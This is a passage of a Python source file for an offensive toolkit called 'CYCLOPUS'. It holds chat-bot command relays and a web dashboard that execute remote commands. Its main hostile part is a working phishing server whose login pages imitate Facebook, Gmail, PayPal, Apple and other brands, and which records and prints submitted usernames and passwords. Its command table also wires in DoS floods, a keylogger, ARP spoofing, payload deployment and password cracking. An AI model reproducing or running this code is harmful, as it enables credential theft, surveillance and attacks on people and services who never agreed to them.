          pieCtx.fillStyle = '#a9948a';
          pieCtx.fillText('DATA MIX', cx, cy + 10);
        }
        
        function renderLegends(){
          const barLegend = document.getElementById('barLegend');
          barLegend.innerHTML = '';
          barLabels.forEach((label, idx)=>{
            const item = document.createElement('div');
            item.className = 'item';
            item.innerHTML = `<span class="swatch" style="background:${ORANGE_PALETTE[idx % ORANGE_PALETTE.length]}"></span>${label}`;
            barLegend.appendChild(item);
          });
        
          const pieLegend = document.getElementById('pieLegend');
          pieLegend.innerHTML = '';
          pieLabels.forEach((label, idx)=>{
            const item = document.createElement('div');
            item.className = 'item';
            item.innerHTML = `<span class="swatch" style="background:${ORANGE_PALETTE[idx % ORANGE_PALETTE.length]}"></span>${label}`;
            pieLegend.appendChild(item);
          });
        }
        
        function regenerateChartData(){
          randomizeData();
          drawBarChart();
          drawPieChart();
        }
        
        document.getElementById('refreshChartsBtn').addEventListener('click', ()=>{
          regenerateChartData();
          printLine('telemetry charts refreshed via button.', 'system');
        });
        
        /* ---------- Init ---------- */
        window.addEventListener('load', ()=>{
          bootSequence();
          renderLegends();
          drawBarChart();
          drawPieChart();
          inputEl.focus();
        });
        
        window.addEventListener('resize', ()=>{
          drawBarChart();
          drawPieChart();
        });
        </script>
        </body>
        </html>
        '''
        
        @app.route('/')
        def index():
            return render_template_string(TEMPLATE)
        
        @app.route('/api/command', methods=['POST'])
        def api_command():
            data = request.json
            command = data.get('command', '')
            result = self.handler.execute(command, 'web', 'web_user')
            return jsonify(result)
        
        @app.route('/api/stats')
        def api_stats():
            stats = self.db.get_statistics()
            return jsonify(stats)
        
        @app.route('/api/threats')
        def api_threats():
            threats = self.db.get_recent_threats(20) if hasattr(self.db, 'get_recent_threats') else []
            return jsonify({'threats': threats})
        
        self.app = app
        self.socketio = socketio
        return app
    
    def start(self):
        if not WEB_AVAILABLE:
            print(f"{Colors.WARNING}⚠️ Flask not available. Web dashboard disabled.{Colors.RESET}")
            return
        
        app = self.create_app()
        if app:
            port = self.config.get('web.port', 5000)
            host = self.config.get('web.host', '0.0.0.0')
            thread = threading.Thread(target=lambda: self.socketio.run(app, host=host, port=port, debug=False), daemon=True)
            thread.start()
            self.running = True
            print(f"{Colors.SUCCESS}✅ Web dashboard running at http://{host}:{port}{Colors.RESET}")

# =====================
# PLATFORM BOTS
# =====================

class DiscordBot:
    def __init__(self, handler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.bot = None
        self.running = False
        self.config = {'enabled': False, 'token': '', 'prefix': '!'}
    
    def setup(self) -> bool:
        if not DISCORD_AVAILABLE:
            return False
        if not self.config.get('token'):
            return False
        
        intents = discord.Intents.default()
        intents.message_content = True
        self.bot = commands.Bot(command_prefix=self.config.get('prefix', '!'), intents=intents)
        
        @self.bot.event
        async def on_ready():
            print(f"{Colors.SUCCESS}✅ Discord bot connected as {self.bot.user}{Colors.RESET}")
            self.running = True
        
        @self.bot.event
        async def on_message(message):
            if message.author.bot:
                return
            if message.content.startswith(self.config.get('prefix', '!')):
                cmd = message.content[len(self.config.get('prefix', '!')):].strip()
                result = self.handler.execute(cmd, 'discord', str(message.author.id))
                output = result.get('output', '')[:1900]
                embed = discord.Embed(title="🐙 CYCLOPUS Response", description=f"```{output}```",
                                     color=0xFF7A1A)
                embed.set_footer(text=f"Time: {result.get('execution_time', 0):.2f}s")
                await message.channel.send(embed=embed)
            await self.bot.process_commands(message)
        return True
    
    def start(self):
        if self.bot:
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            asyncio.run(self.bot.start(self.config['token']))
        except Exception as e:
            logger.error(f"Discord bot error: {e}")
    
    def send_message(self, text: str):
        try:
            if self.bot and self.running:
                channel = self.bot.get_channel(int(self.config.get('channel_id', 0)))
                if channel:
                    asyncio.run_coroutine_threadsafe(channel.send(text), self.bot.loop)
        except:
            pass

class TelegramBot:
    def __init__(self, handler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.client = None
        self.running = False
        self.config = {'enabled': False, 'bot_token': '', 'chat_id': '', 'prefix': '/'}
    
    def setup(self) -> bool:
        if not TELETHON_AVAILABLE:
            return False
        if not self.config.get('bot_token'):
            return False
        return True
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            async def main():
                self.client = TelegramClient('cyclopus_session', 1, 'dummy')
                await self.client.start(bot_token=self.config['bot_token'])
                print(f"{Colors.SUCCESS}✅ Telegram bot connected{Colors.RESET}")
                self.running = True
                
                @self.client.on(events.NewMessage)
                async def handler(event):
                    if event.message.text and event.message.text.startswith(self.config.get('prefix', '/')):
                        cmd = event.message.text[1:].strip()
                        result = self.handler.execute(cmd, 'telegram', str(event.sender_id))
                        output = result.get('output', '')[:4000]
                        await event.reply(f"```{output}```\n_Time: {result.get('execution_time', 0):.2f}s_")
                
                await self.client.run_until_disconnected()
            
            asyncio.run(main())
        except Exception as e:
            logger.error(f"Telegram bot error: {e}")
    
    def send_message(self, text: str):
        try:
            if self.client and self.running:
                asyncio.run_coroutine_threadsafe(
                    self.client.send_message(self.config['chat_id'], text[:4000]),
                    self.client.loop
                )
        except:
            pass

class SlackBot:
    def __init__(self, handler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.client = None
        self.running = False
        self.config = {'enabled': False, 'bot_token': '', 'channel_id': '', 'prefix': '!'}
    
    def setup(self) -> bool:
        if not SLACK_AVAILABLE:
            return False
        if not self.config.get('bot_token'):
            return False
        self.client = WebClient(token=self.config['bot_token'])
        return True
    
    def start(self):
        if self.client:
            self.running = True
            print(f"{Colors.SUCCESS}✅ Slack bot initialized{Colors.RESET}")
    
    def send_message(self, text: str):
        try:
            if self.client:
                self.client.chat_postMessage(
                    channel=self.config.get('channel_id', 'general'),
                    text=text[:4000]
                )
        except:
            pass

class SignalBot:
    def __init__(self, handler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.running = False
        self.config = {'enabled': False, 'phone_number': '', 'prefix': '!'}
    
    def setup(self) -> bool:
        return SIGNAL_AVAILABLE and self.config.get('phone_number')
    
    def start(self):
        if self.setup():
            self.running = True
            print(f"{Colors.SUCCESS}✅ Signal bot initialized{Colors.RESET}")
    
    def send_message(self, text: str):
        try:
            if self.running:
                cmd = ['signal-cli', 'send', '--number', self.config['phone_number'], '--message', text[:4000]]
                subprocess.run(cmd, capture_output=True, timeout=10)
        except:
            pass

class WhatsAppBot:
    def __init__(self, handler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.running = False
        self.config = {'enabled': False, 'phone_number': '', 'prefix': '!'}
    
    def start(self):
        self.running = True
        print(f"{Colors.SUCCESS}✅ WhatsApp bot initialized{Colors.RESET}")
    
    def send_message(self, text: str):
        try:
            import pywhatkit
            pywhatkit.sendwhatmsg_instantly(self.config['phone_number'], text[:4000])
        except:
            pass

class GoogleChatBot:
    def __init__(self, handler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.running = False
        self.config = {'enabled': False, 'webhook_url': '', 'prefix': '/'}
    
    def start(self):
        self.running = True
        print(f"{Colors.SUCCESS}✅ Google Chat bot initialized{Colors.RESET}")
    
    def send_message(self, text: str):
        try:
            data = {'text': text[:4000]}
            requests.post(self.config['webhook_url'], json=data, timeout=10)
        except:
            pass

class iMessageBot:
    def __init__(self, handler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.running = False
        self.config = {'enabled': False, 'phone_numbers': [], 'prefix': '!'}
    
    def start(self):
        if IMESSAGE_AVAILABLE:
            self.running = True
            print(f"{Colors.SUCCESS}✅ iMessage bot initialized{Colors.RESET}")
    
    def send_message(self, text: str, phone: str = None):
        if not IMESSAGE_AVAILABLE:
            return
        try:
            for number in self.config.get('phone_numbers', []):
                script = f'''
                tell application "Messages"
                    set targetService to 1st service whose service type = iMessage
                    set targetBuddy to buddy "{number}" of targetService
                    send "{text[:4000]}" to targetBuddy
                end tell
                '''
                subprocess.run(['osascript', '-e', script], capture_output=True, timeout=10)
        except:
            pass

# =====================
# PHISHING SERVER
# =====================
class PhishingRequestHandler(BaseHTTPRequestHandler):
    server_instance = None
    
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        
        if self.server_instance and self.server_instance.html_content:
            self.wfile.write(self.server_instance.html_content.encode())
        
        if self.server_instance and self.server_instance.db and self.server_instance.link_id:
            self.server_instance.db.conn.execute(
                "UPDATE phishing_links SET clicks = clicks + 1 WHERE id = ?",
                (self.server_instance.link_id,)
            )
            self.server_instance.db.conn.commit()
    
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode()
        form_data = urllib.parse.parse_qs(post_data)
        
        username = form_data.get('email', form_data.get('username', ['']))[0]
        password = form_data.get('password', [''])[0]
        client_ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'Unknown')
        
        if self.server_instance and self.server_instance.db and username and password:
            self.server_instance.db.save_captured_credential(
                self.server_instance.link_id, username, password, client_ip, user_agent
            )
            print(f"\n{Colors.ERROR}🎣 CREDENTIALS CAPTURED!{Colors.RESET}")
            print(f"  IP: {client_ip}")
            print(f"  Username: {username}")
            print(f"  Password: {password}")
        
        self.send_response(302)
        self.send_header('Location', 'https://www.google.com')
        self.end_headers()

class PhishingServer:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.server = None
        self.running = False
        self.link_id = None
        self.html_content = None
    
    def start(self, link_id: str, platform: str, html_content: str, port: int = 8080) -> bool:
        try:
            self.link_id = link_id
            self.html_content = html_content
            
            handler = PhishingRequestHandler
            handler.server_instance = self
            
            self.server = socketserver.TCPServer(("0.0.0.0", port), handler)
            thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            thread.start()
            self.running = True
            return True
        except:
            return False
    
    def stop(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.running = False

# =====================
# SOCIAL ENGINEERING TOOLS
# =====================
class SocialEngineeringTools:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.phishing_server = PhishingServer(db)
        self.active_links = {}
    
    def generate_phishing_link(self, platform: str) -> Dict:
        link_id = str(uuid.uuid4())[:8]
        
        templates = {
            'facebook': self._get_template("Facebook", "#1877f2"),
            'instagram': self._get_template("Instagram", "#0095f6"),
            'twitter': self._get_template("X / Twitter", "#1d9bf0"),
            'gmail': self._get_template("Gmail", "#1a73e8"),
            'linkedin': self._get_template("LinkedIn", "#0a66c2"),
            'microsoft': self._get_template("Microsoft", "#0078d4"),
            'google': self._get_template("Google", "#4285f4"),
            'apple': self._get_template("Apple", "#0071e3"),
            'paypal': self._get_template("PayPal", "#0070ba"),
            'amazon': self._get_template("Amazon", "#ff9900"),
            'netflix': self._get_template("NETFLIX", "#e50914"),
            'spotify': self._get_template("Spotify", "#1ed760"),
            'whatsapp': self._get_template("WhatsApp", "#25d366"),
            'telegram': self._get_template("Telegram", "#2aabee"),
            'discord': self._get_template("Discord", "#5865f2"),
        }
        
        html = templates.get(platform, self._custom_template())
        
        link = PhishingLink(
            id=link_id,
            platform=platform,
            phishing_url=f"http://localhost:8080",
            template=platform,
            created_at=datetime.datetime.now().isoformat()
        )
        
        self.db.save_phishing_link(link)
        self.active_links[link_id] = {'platform': platform, 'html': html}
        
        return {'success': True, 'link_id': link_id, 'platform': platform}
    
    def start_server(self, link_id: str, port: int = 8080) -> bool:
        if link_id not in self.active_links:
            return False
        link_data = self.active_links[link_id]
        return self.phishing_server.start(link_id, link_data['platform'], link_data['html'], port)
    
    def stop_server(self):
        self.phishing_server.stop()
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        return self.db.get_captured_credentials(link_id)
    
    def _get_template(self, display_name: str, color: str) -> str:
        return f"""<!DOCTYPE html>
<html><head><title>{display_name}</title>
<style>
body{{font-family:Arial;background:#0a0a0a;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}}
.login-box{{background:#1a1a1a;border:1px solid #ff7a1a;border-radius:8px;padding:20px;width:400px;box-shadow:0 0 30px rgba(255,122,26,0.2)}}
.logo{{color:{color};font-size:32px;text-align:center;margin-bottom:20px}}
input{{width:100%;padding:14px;margin:10px 0;background:#0a0a0a;border:1px solid #333;border-radius:6px;box-sizing:border-box;color:#fff}}
input:focus{{outline:none;border-color:#ff7a1a}}
button{{width:100%;padding:14px;background:{color};color:white;border:none;border-radius:6px;font-size:20px;cursor:pointer}}
.warning{{margin-top:20px;padding:10px;background:rgba(255,122,26,0.1);color:#ffb066;text-align:center;border-radius:4px;font-size:12px}}
</style>
</head>
<body>
<div class="login-box"><div class="logo">{display_name}</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _custom_template(self) -> str:
        return """<!DOCTYPE html>
<html><head><title>Secure Login</title>
<style>
body{font-family:Arial;background:#0a0a0a;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:#1a1a1a;border:1px solid #ff7a1a;border-radius:8px;padding:40px;width:400px;box-shadow:0 0 30px rgba(255,122,26,0.2)}
.logo{text-align:center;margin-bottom:30px;color:#ff7a1a;font-size:28px;font-weight:bold}
input{width:100%;padding:14px;margin:10px 0;background:#0a0a0a;border:1px solid #333;border-radius:6px;color:#fff;box-sizing:border-box}
input:focus{outline:none;border-color:#ff7a1a}
button{width:100%;padding:14px;background:#ff7a1a;color:white;border:none;border-radius:6px;cursor:pointer;font-weight:bold;font-size:16px}
.warning{margin-top:20px;padding:10px;background:rgba(255,122,26,0.1);border-radius:6px;color:#ffb066;text-align:center;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">🐙 CYCLOPUS</div>
<form method="POST"><input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Secure Login</button></form>
<div class="warning">🔒 Secure connection - Do not enter real credentials</div>
</div>
</body>
</html>"""

# =====================
# COMMAND HANDLER
# =====================
class CommandHandler:
    def __init__(self, db: DatabaseManager, ssh_manager: SSHManager = None,
                 traffic_gen: TrafficGeneratorEngine = None,
                 dos_engine = None,
                 keylogger: KeyloggerEngine = None,
                 deployment_engine = None,
                 cracking_engine: CrackingEngine = None,
                 arp_spoofing: ARPSpoofingEngine = None,
                 mac_manager: MACManager = None,
                 nat_info: NATInfoEngine = None,
                 transformer: TransformerEngine = None,
                 email_composer: EmailComposerEngine = None,
                 pdf_report: PDFReportGenerator = None,
                 docker_scanner: DockerScanner = None,
                 social_tools: SocialEngineeringTools = None,
                 network_monitor = None):
        self.db = db
        self.ssh = ssh_manager
        self.traffic = traffic_gen
        self.dos = dos_engine
        self.keylogger = keylogger
        self.deployment = deployment_engine
        self.cracking = cracking_engine
        self.arp_spoofing = arp_spoofing
        self.mac_manager = mac_manager
        self.nat_info = nat_info
        self.transformer = transformer
        self.email_composer = email_composer
        self.pdf_report = pdf_report
        self.docker_scanner = docker_scanner
        self.social = social_tools or SocialEngineeringTools(db)
        self.network_monitor = network_monitor
        self.tools = NetworkTools()
        self.commands = self._build_commands()
    
    def _build_commands(self) -> Dict[str, Callable]:
        return {
            # Ping Commands
            'ping': self._ping,
            'ping6': self._ping6,
            'ping_sweep': self._ping_sweep,
            
            # Nmap Commands
            'nmap': self._nmap,
            'nmap_quick': self._nmap_quick,
            'nmap_full': self._nmap_full,
            'nmap_os': self._nmap_os,
            'nmap_service': self._nmap_service,
            'nmap_udp': self._nmap_udp,
            'nmap_vuln': self._nmap_vuln,
            'nmap_stealth': self._nmap_stealth,
            
            # Wget Commands
            'wget': self._wget,
            'wget_file': self._wget_file,
            'wget_recursive': self._wget_recursive,
            
            # Curl Commands
            'curl': self._curl,
            'curl_get': self._curl_get,
            'curl_post': self._curl_post,
            'curl_head': self._curl_head,
            
            # Netcat Commands
            'nc': self._netcat,
            'netcat': self._netcat,
            'nc_listen': self._nc_listen,
            'nc_scan': self._nc_scan,
            
            # Traceroute Commands
            'traceroute': self._traceroute,
            'tracert': self._traceroute,
            
            # Whois Commands
            'whois': self._whois,
            
            # DNS Commands
            'dns': self._dns,
            'dig': self._dig,
            'nslookup': self._nslookup,
            'host': self._host,
            
            # Location Commands
            'location': self._location,
            
            # SSH Commands
            'ssh_add': self._ssh_add,
            'ssh_list': self._ssh_list,
            'ssh_connect': self._ssh_connect,
            'ssh_exec': self._ssh_exec,
            'ssh_disconnect': self._ssh_disconnect,
            
            # Traffic Generation
            'traffic': self._traffic,
            'traffic_types': self._traffic_types,
            'traffic_stop': self._traffic_stop,
            'traffic_status': self._traffic_status,
            
            # DOS Attacks
            'dos_syn': self._dos_syn,
            'dos_udp': self._dos_udp,
            'dos_http': self._dos_http,
            'dos_icmp': self._dos_icmp,
            'dos_stop': self._dos_stop,
            'dos_status': self._dos_status,
            
            # Keylogger
            'keylogger_start': self._keylogger_start,
            'keylogger_stop': self._keylogger_stop,
            'keylogger_status': self._keylogger_status,
            'keylogger_logs': self._keylogger_logs,
            'keylogger_screenshots': self._keylogger_screenshots,
            'keylogger_clipboard': self._keylogger_clipboard,
            
            # Deployment
            'deploy_pdf': self._deploy_pdf,
            'deploy_email': self._deploy_email,
            'deploy_link': self._deploy_link,
            'deploy_executable': self._deploy_executable,
            'deploy_list': self._deploy_list,
            
            # Social Engineering
            'phish_facebook': lambda _: self._phish('facebook'),
            'phish_instagram': lambda _: self._phish('instagram'),
            'phish_twitter': lambda _: self._phish('twitter'),
            'phish_gmail': lambda _: self._phish('gmail'),
            'phish_linkedin': lambda _: self._phish('linkedin'),
            'phish_microsoft': lambda _: self._phish('microsoft'),
            'phish_google': lambda _: self._phish('google'),
            'phish_apple': lambda _: self._phish('apple'),
            'phish_paypal': lambda _: self._phish('paypal'),
            'phish_amazon': lambda _: self._phish('amazon'),
            'phish_netflix': lambda _: self._phish('netflix'),
            'phish_spotify': lambda _: self._phish('spotify'),
            'phish_whatsapp': lambda _: self._phish('whatsapp'),
            'phish_telegram': lambda _: self._phish('telegram'),
            'phish_discord': lambda _: self._phish('discord'),
            'phish_start': self._phish_start,
            'phish_stop': self._phish_stop,
            'phish_creds': self._phish_creds,
            
            # Cracking Commands
            'crack': self._crack,
            'crack_status': self._crack_status,
            'crack_list': self._crack_list,
            
            # ARP Spoofing Commands
            'arp_spoof': self._arp_spoof,
            'arp_stop': self._arp_stop,
            'arp_status': self._arp_status,
            'arp_history': self._arp_history,
            
            # MAC Commands
            'mac_info': self._mac_info,
            'mac_scan': self._mac_scan,
            'mac_vendor': self._mac_vendor,
            
            # NAT Commands
            'nat_info': self._nat_info,
            'nat_public': self._nat_public,
            'nat_private': self._nat_private,
            
            # Transformer Commands
            'transform': self._transform,
            
            # Docker Commands
            'docker_scan': self._docker_scan,
            'docker_info': self._docker_info,
            'docker_ps': self._docker_ps,
            'docker_images': self._docker_images,
            
            # Email Commands
            'email_compose': self._email_compose,
            'email_send': self._email_send,
            'email_list': self._email_list,
            
            # PDF Report Commands
            'report_generate': self._report_generate,
            'report_list': self._report_list,
            
            # Network Monitor
            'netmon_start': self._netmon_start,
            'netmon_stop': self._netmon_stop,
            'netmon_status': self._netmon_status,
            'netmon_packets': self._netmon_packets,
            
            # Scan Commands
            'scan': self._scan,
            'quick_scan': self._quick_scan,
            'full_scan': self._full_scan,
            
            # IP Management
            'add_ip': self._add_ip,
            'remove_ip': self._remove_ip,
            'block_ip': self._block_ip,
            'unblock_ip': self._unblock_ip,
            'list_ips': self._list_ips,
            'ip_info': self._ip_info,
            'analyze_ip': self._analyze_ip,
            
            # Animation Commands
            'anim_spinner': self._anim_spinner,
            'anim_matrix': self._anim_matrix,
            'anim_pulse': self._anim_pulse,
            'anim_wave': self._anim_wave,
            'anim_glitch': self._anim_glitch,
            'anim_octopus': self._anim_octopus,
            
            # System Commands
            'status': self._status,
            'history': self._history,
            'system': self._system,
            'report': self._report,
            'clear': self._clear,
            
            # Help
            'help': self._help,
        }
    
    def execute(self, command: str, source: str = "local", user_id: str = None) -> Dict:
        start_time = time.time()
        
        parts = command.strip().split()
        if not parts:
            return {'success': False, 'output': 'Empty command', 'execution_time': 0}
        
        cmd_name = parts[0].lower()
        args = parts[1:]
        
        # Try transformer for natural language
        if self.transformer:
            processed = self.transformer.process_input(command)
            if processed['confidence'] > 0.7 and processed['command'] != 'unknown':
                cmd_name = processed['command']
                for key, value in processed.get('params', {}).items():
                    if key == 'ip' and value not in args:
                        args = [value] + args
                    elif key == 'port' and str(value) not in args:
                        args.append(str(value))
        
        if cmd_name in self.commands:
            try:
                result = self.commands[cmd_name](args)
            except Exception as e:
                result = {'success': False, 'output': f"Error: {e}", 'execution_time': 0}
        else:
            result = self._generic(command)
        
        execution_time = time.time() - start_time
        result['execution_time'] = execution_time
        
        self.db.log_command(command, source, source, user_id, result.get('success', False),
                           str(result.get('output', ''))[:5000], execution_time)
        
        return result
    
    # ==================== Animation Commands ====================
    def _anim_spinner(self, args: List[str]) -> Dict:
        duration = float(args[0]) if args and args[0].replace('.', '').isdigit() else 2.0
        message = ' '.join(args[1:]) if len(args) > 1 else "Processing"
        TerminalAnimation.spinner(duration, message)
        return {'success': True, 'output': f"🎬 Spinner animation displayed for {duration}s"}
    
    def _anim_matrix(self, args: List[str]) -> Dict:
        duration = float(args[0]) if args and args[0].replace('.', '').isdigit() else 2.0
        TerminalAnimation.matrix_rain(duration)
        return {'success': True, 'output': f"🌧️ Matrix rain animation displayed for {duration}s"}
    
    def _anim_pulse(self, args: List[str]) -> Dict:
        duration = float(args[0]) if args and args[0].replace('.', '').isdigit() else 2.0
        text = ' '.join(args[1:]) if len(args) > 1 else "🐙 CYCLOPUS"
        TerminalAnimation.pulse_animation(text, duration)
        return {'success': True, 'output': f"💓 Pulse animation displayed for {duration}s"}
    
    def _anim_wave(self, args: List[str]) -> Dict:
        duration = float(args[0]) if args and args[0].replace('.', '').isdigit() else 2.0
        text = ' '.join(args[1:]) if len(args) > 1 else "🌊 CYCLOPUS"
        TerminalAnimation.wave_animation(text, duration)
        return {'success': True, 'output': f"🌊 Wave animation displayed for {duration}s"}
    
    def _anim_glitch(self, args: List[str]) -> Dict:
        duration = float(args[0]) if args and args[0].replace('.', '').isdigit() else 1.0
        text = ' '.join(args[1:]) if len(args) > 1 else "🐙 GLITCH"
        TerminalAnimation.glitch_effect(text, duration)
        return {'success': True, 'output': f"⚡ Glitch animation displayed for {duration}s"}
    
    def _anim_octopus(self, args: List[str]) -> Dict:
        duration = float(args[0]) if args and args[0].replace('.', '').isdigit() else 2.0
        TerminalAnimation.octopus_animation(duration)
        return {'success': True, 'output': f"🐙 Octopus animation displayed for {duration}s"}
    
    # ==================== Ping Commands ====================
    def _ping(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping <target> [count]'}
        target = args[0]
        count = int(args[1]) if len(args) > 1 and args[1].isdigit() else 4
        result = self.tools.ping(target, count)
        return {'success': result.success, 'output': result.output}
    
    def _ping6(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping6 <target>'}
        target = args[0]
        result = self._generic(f'ping6 -c 4 {target}')
        return result
    
    def _ping_sweep(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_sweep <network> (e.g., 192.168.1.0/24)'}
        network = args[0]
        result = self._generic(f'nmap -sn {network}')
        return result
    
    # ==================== Nmap Commands ====================
    def _nmap(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap <target> [options]'}
        target = args[0]
        result = self.tools.nmap(target)
        return {'success': result.success, 'output': result.output}
    
    def _nmap_quick(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_quick <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'quick')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_full(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_full <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'full')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_os(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_os <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'os')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_service(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_service <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'service')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_udp(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_udp <target>'}
        target = args[0]
        result = self._generic(f'nmap -sU {target}')
        return result
    
    def _nmap_vuln(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_vuln <target>'}
        target = args[0]
        result = self._generic(f'nmap --script vuln {target}')
        return result
    
    def _nmap_stealth(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_stealth <target>'}
        target = args[0]
        result = self._generic(f'nmap -sS -T2 {target}')
        return result
    
    # ==================== Wget Commands ====================
    def _wget(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget <url> [output]'}
        url = args[0]
        output = args[1] if len(args) > 1 else None
        result = self.tools.wget(url, output)
        return {'success': result.success, 'output': result.output}
    
    def _wget_file(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_file <url> <filename>'}
        url = args[0]
        filename = args[1]
        result = self.tools.wget(url, filename)
        return {'success': result.success, 'output': result.output}
    
    def _wget_recursive(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_recursive <url>'}
        url = args[0]
        result = self._generic(f'wget -r -l 2 -np -nd {url}')
        return result
    
    # ==================== Curl Commands ====================
    def _curl(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl <url>'}
        url = args[0]
        result = self.tools.curl(url)
        return {'success': result.success, 'output': result.output}
    
    def _curl_get(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_get <url>'}
        url = args[0]
        result = self.tools.curl(url, 'GET')
        return {'success': result.success, 'output': result.output}
    
    def _curl_post(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_post <url> <data>'}
        url = args[0]
        data = args[1]
        result = self.tools.curl(url, 'POST', data)
        return {'success': result.success, 'output': result.output}
    
    def _curl_head(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_head <url>'}
        url = args[0]
        result = self.tools.curl(url, 'HEAD')
        return {'success': result.success, 'output': result.output}
    
    # ==================== Netcat Commands ====================
    def _netcat(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: netcat <host> <port> [command]'}
        host = args[0]
        port = int(args[1])
        command = args[2] if len(args) > 2 else None
        result = self.tools.netcat(host, port, command)
        return {'success': result.success, 'output': result.output}
    
    def _nc_listen(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nc_listen <port>'}
        port = args[0]
        result = self._generic(f'nc -lvp {port}')
        return result
    
    def _nc_scan(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_scan <host> <port_range>'}
        host = args[0]
        ports = args[1]
        result = self._generic(f'nc -zv {host} {ports}')
        return result
    
    # ==================== Traceroute Commands ====================
    def _traceroute(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute <target>'}
        target = args[0]
        result = self.tools.traceroute(target)
        return {'success': result.success, 'output': result.output}
    
    # ==================== Whois Commands ====================
    def _whois(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: whois <domain>'}
        domain = args[0]
        result = self.tools.whois(domain)
        return {'success': result.success, 'output': result.output}
    
    # ==================== DNS Commands ====================
    def _dns(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: dns <domain> [record_type]'}
        domain = args[0]
        record_type = args[1] if len(args) > 1 else 'A'
        result = self.tools.dns(domain, record_type)
        return {'success': result.success, 'output': result.output}
    
    def _dig(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: dig <domain>'}
        domain = args[0]
        result = self._generic(f'dig {domain}')
        return result
    
    def _nslookup(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nslookup <domain>'}
        domain = args[0]
        result = self._generic(f'nslookup {domain}')
        return result
    
    def _host(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: host <domain>'}
        domain = args[0]
        result = self._generic(f'host {domain}')
        return result
    
    # ==================== Location Commands ====================
    def _location(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: location <ip>'}
        ip = args[0]
        result = self.tools.location(ip)
        if result.get('success'):
            output = f"📍 Location for {ip}:\n"
            output += f"  Country: {result.get('country', 'Unknown')}\n"
            output += f"  City: {result.get('city', 'Unknown')}\n"
            output += f"  ISP: {result.get('isp', 'Unknown')}"
            return {'success': True, 'output': output}
        return {'success': False, 'output': f"Could not get location for {ip}"}
    
    # ==================== SSH Commands ====================
    def _ssh_add(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_add <name> <host> <username> [password]'}
        name = args[0]
        host = args[1]
        username = args[2]
        password = args[3] if len(args) > 3 else None
        conn = self.ssh.add_connection(name, host, username, password)
